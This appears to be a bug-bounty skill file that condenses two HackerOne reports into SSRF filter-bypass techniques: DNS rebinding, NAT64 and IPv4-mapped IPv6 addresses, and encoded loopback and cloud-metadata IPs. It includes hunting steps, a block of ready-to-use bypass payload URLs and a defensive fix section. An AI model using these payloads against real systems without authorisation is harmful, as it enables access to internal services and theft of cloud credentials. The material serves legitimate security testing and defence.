---
name: ssrf-filter-bypass
description: SSRF IP/URL filter bypasses — DNS rebinding and NAT64 IPv6 (64:ff9b::/96) to reach internal/metadata hosts that hostname/allowlist checks block. Teaches advanced SSRF filter evasion beyond basic decimal/hex IP tricks.
sources: hackerone_public
report_count: 2
---

# SSRF Filter Bypass (DNS rebinding & NAT64 IPv6)

**Reports**: arkadiyt-projects — "SSRF Filter Bypass via Unblocked NAT64 Local-Use IPv6 Prefix 64:ff9b:1::/48" (hackerone.com/reports/3634400, high); PortSwigger — "DNS Rebinding SSRF in Burp Suite MCP Server via send_http1_request" (hackerone.com/reports/3176157).

## Why it matters (the new lesson)
Naive SSRF filters block `127.0.0.1`/`169.254.169.254`/RFC1918 and resolve the hostname once. Bypasses:
- **DNS rebinding**: a domain resolves to a public IP at validation time, then to `127.0.0.1` at fetch time (TTL=0, two A records).
- **NAT64/IPv6**: `64:ff9b::/96` (and local-use `64:ff9b:1::/48`) map IPv4→IPv6; many filters forget to block IPv6, so `64:ff9b::7f00:1` == `127.0.0.1` and `64:ff9b::a9fe:a9fe` == `169.254.169.254`.

## How it works
- IPv6-mapped literals: `http://[::ffff:169.254.169.254]/`, `http://[64:ff9b::a9fe:a9fe]/`.
- Decimal/hex/octal: `http://2130706433/` (127.0.0.1), `http://0x7f000001/`, `http://0177.0.0.1/`.
- DNS rebinding service: `rebind.it` / `1u.ms` style dual-answer domains.

## How to hunt for it
1. Find SSRF with hostname validation; test all integer/octal/hex/IPv6 encodings of internal IPs.
2. Use a DNS-rebinding domain pointing to `169.254.169.254` (AWS) or `127.0.0.1`; watch OOB.
3. For each cloud, target the right metadata IP + required headers.

## Payloads
```
http://[::ffff:127.0.0.1]/          # IPv4-mapped IPv6
http://[64:ff9b::a9fe:a9fe]/        # NAT64 → 169.254.169.254
http://2130706433/                  # decimal 127.0.0.1
http://0x7f.0x0.0x0.0x1/            # hex
http://127.1/                       # shorthand
```

## Fix
Resolve DNS at fetch time (not validation time); block all IPv4/IPv6 encodings of loopback/link-local/RFC1918/metadata; use an egress proxy allowlist; prevent DNS rebinding (validate resolved IP == the one you connect to).
